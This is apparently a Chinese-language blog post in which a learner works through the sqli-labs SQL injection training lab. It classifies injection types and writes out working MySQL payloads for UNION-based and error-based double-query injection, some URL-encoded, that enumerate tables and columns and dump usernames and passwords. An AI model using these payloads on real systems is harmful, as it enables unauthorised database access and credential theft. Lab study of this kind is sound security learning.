---
layout: post
title: sql注入
tag: codes
---

<h2>sql注入</h2>

好不容易找到一点方法，开始入门了，从sql注入开始学习。

在github上有一个开源的sql注入学习框架，[sqli-labs](https://github.com/Audi-1/sqli-labs)，利用的是PHP+Mysql。
clone框架到了woobuntu上，并且配置好环境(apache2+php+mysql)。
正好可以学习一点php和mysql的知识。

<h2>About</h2>

学习的过程中来总结sql注入中所用的语句(mysql环境)。
sql注入可以按照不同的方法进行分类。

可以按照注入点类型分类，按照提交数据的方式进行分类，也可以按照执行效果来分类。

<h3>按照注入点类型来分类</h3>

<h4>数字型注入点</h4>

在 Web 端大概是 http://xxx.com/news.php?id=1 这种形式，其注入点 id 类型为数字，所以
叫数字型注入点。这一类的 SQL 语句原型大概为 select * from 表名 where id=1。

<h4>字符型注入点</h4>

在 Web 端大概是 http://xxx.com/news.php?name=admin 这种形式，其注入点 name 类型为
字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 select * from 表名 where name='admin'。
注意多了引号。

<h4>搜索型注入点</h4>

这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，
有的不显示在的链接地址里面，而是直接通过搜索框表单提交。
此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like '%关键字%'。

<h3>按照数据提交的方式来分类</h3>

这种分类其实只是 HTTP 传递数据的方式不同，严格来讲和 SQL 没多大关系。

<h4>GET 注入</h4>

提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接
http://xxx.com/news.php?id=1 , id 是注入点。

<h4>POST 注入</h4>

使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。

<h4>Cookie 注入</h4>

HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。

<h4>HTTP 头部注入</h4>

注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，
Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。

<h3>按照执行效果来分类</h3>

<h4>基于报错注入</h4>

这一类的也叫有回显注入，页面会返回错误信息，或者是把注入语句的结果直接返回在页面中。

<h4>基于布尔的盲注</h4>

根据返回页面的结果判断构造的 SQL 条件语句的真假性

<h4>基于时间的盲注</h4>

当根据页面返回的内容不能判断出任何信息时，使用条件语句查看时间延迟语句是否执行，
也就是看页面返回时间是否增长来判断是否执行。

<h2>注入语句</h2>

<h3>常用mysql函数</h3>

<code>version()</code>

<code>current_user()</code>

<code>select * from information_schema.tables/columns</code>

<h3>Part 1</h3>

<code>1.union select 1,2,3...</code>

<code>2.order by x</code>

这两个语句主要是在成功提交数据后，猜解column数，并能够找到合适的地方显示我们注入后返回的数据。

配合在mysql version>5.0，在mysql存在information_schema.tables，和columns，能够显示所有
的表名和列名。

如：当判断当前的列数之后，假设为3

<code>union select 1,2,table_name from information_schema.tables</code>

<code>union select 1,2,column_name from information_schema.columns</code>

table_name和column_name存在的位置和最后在页面返回的结果相关。若最后结果只显示返回列中的后两列，
那么相应的，table_name和column_name也必须在最后两列。


<h4>Example</h4>

<h5>GET - Error based - Single quotes - String</h5>

进入网页，提示input the id as parameter。

那么就在url后面加上?id=1。

结果返回：

<img src="/images/sql_1.png">

这是正常提交数据的结果，而题目说Single quotes，那么我们在后面加上一个" ' "单引号。

提交数据：?id=1'

结果返回：

<img src="/images/sql_2.png">

报错。
<code> ''1'' LIMIT 0,1'	</code>
根据报错来看，是多加了一个引号导致语句提前闭合。第一个和最后一个引号为报错时自动提供的，第二个和
第四个引号为php处理加上的，第三个引号为提交上去的。

可以根据php代码来看，构成sql语句的代码为

<code>$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code>

在提交数据后，完整的语句应该是

<code>SELECT * FROM users WHERE id='1'' LIMIT 0,1</code>。

想要正确的执行这条语句，那么必须去掉后面多余的语句。既然没有做任何的过滤，那么就能够提交'#'或者'--'，
这两个符号在mysql中，都是表示注释到行尾。但在url中，不能直接提交'#'符号，需要经过urlencode，
也就是提交'%23'。'--'在mysql中的限制就是至少在这个符号前面或后面得有空格。

那现在可以提交数据：?id=1'%23 

结果返回：

<img src="/images/sql_1.png">

<h5>利用</h5>

这样，我们就可以绕过sql语句的限制，插入我们想要的语句。
比如：?id=1'%23 union select 1,2,3
先找出表字段有几个。之后再用：?id=1' union select 1,2,table_name from information_schema.tables%23，
以及：?id=1' union select 1,2,column_name from information_schema.columns%23，
理论上这样表名和列名都能获取了。不过在这个例子中，php代码里面有做限制，只能读取mysql语句
执行后返回结果的第一条记录，我们可以这样做修改：

{% highlight php %}

while($row = mysql_fetch_array($result)){

	echo "<font size='5' color= '#99FF00'>";
	echo 'Your Login name:'. $row['username'];
	echo "<br>";
	echo 'Your Password:' .$row['password'];
	echo "<br>";
	echo "</font>";
}

	if(!$row)
	{
	echo '<font color= "#FFFF00">';
	print_r(mysql_error());
	echo "</font>"; 
	}

{% endhighlight %}

由于$row = mysql_fetch_array($result)只取出返回结果的一条记录，所以用循环来控制将所有的结果返回。

根据表名和列名构造最后的语句:?id=1' union select 1,username,password from users%23

<img src="/images/sql_3.png">

Less_1 ～ Less_4都是相同的情况，只需要通过fuzz猜出最后执行的sql语句，然后构造执行自己提交的数据
就成功了。

<h3>Part 2</h3>

<h4>Double query injection</h4>

翻译过来就是二次查询注入，这种注入也是error based类型。利用mysql或者其他类型数据库的报错，在报错中显示
我们需要的数据。

在这种类型的注入中主要利用到几个sql语句：

<code>select concat() 拼接字符串的函数 </code>

<code>select conut(*) 计数的函数</code>

<code>rand() 产生随机浮点数数0~1</code>

<code>floor() 取整</code>

<code>group by 按照某个变量分组</code>

<h6>注入语句：</h6>   

<code>and (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))a from 
information_schema.tables group by a)x)%23</code>

关于这个错误的原理，我还是没有了解清楚。不过大致上是：group by 的值不能为rand()产生的数。

[解释一](https://segmentfault.com/q/1010000000609508)

[解释二](http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do)

<code>update 2016/4/12 </code>

[解释三](http://drops.wooyun.org/tips/14312)

还是大神解释的对。在临时表中插入时产生了重复，二次计算两次的值不一样。所以产生了报错。

多逛wooyun的drops。

<h4>Example</h4>

<h5>Double Injection - Single Quotes </h5>

这种类型的注入，可以利用再页面会显示sql语句错误提示的页面中。

上一个例子也适用。

先测试一下：

?id=1' and (select 1 from (select count(*),
concat((select version()),floor(rand(0)*2))a
from information_schema.tables group by a)x)%23

<img src="/images/sql_4.png">


开始爆表：

?id=1%27%20and%20%28select%201%20from%20%28select%20count%28*%29,
concat%28%28select%20table_name%20from%20information_schema.tables%20limit%20139,1%29,
floor%28rand%280%29*2%29%29a%20from%20information_schema.tables%20group%20by%20a%29x%29%23

<img src="/images/sql_5.png">

接下来就是爆列和字段。可以利用count(*)计算表数量和列数量，尽量limit猜靠后面的非系统默认的表和列。

?id=1' and (select 1 from (select count(*),concat((select column_name
from information_schema.columns limit 1664,1),floor(rand(0)*2))a from 
information_schema.tables group by a)x)%23


<img src="/images/sql_6.png">

<img src="/images/sql_7.png">

因为只能返回一列的数据，所以用limit来限制返回的数据，就只能一个一个数字来试。

?id=1' and (select 1 from (select count(*),
concat((select concat(username,':',password) from users limit 1,1),
floor(rand(0)*2))a from information_schema.tables group by a)x)%23

<img src="/images/sql_8.png">


<code>...待续</code>

EOF